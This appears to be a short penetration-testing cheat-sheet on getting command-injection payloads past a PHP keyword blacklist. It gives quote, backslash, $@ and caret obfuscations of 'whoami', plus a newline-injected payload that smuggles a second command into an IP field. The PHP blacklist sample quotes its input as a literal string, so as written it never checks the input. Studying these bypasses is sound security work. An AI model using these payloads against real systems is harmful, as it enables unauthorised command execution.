## Commands Blacklist
```
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

1. Use characters that are ignored by command shells like Bash or PowerShell
- ' or "
```
w'h'o'am'i
w"h"o"am"i
127.0.0.1%0aw'h'o'am'i
```
- We cannot mix types of quotes
- The number of quotes must be even


## Linux Only
- backslash and the position parameter character $@
- It does not have to be even
```
who$@ami
w\ho\am\i
```

## Windows Only
- caret ^
```
who^ami
```
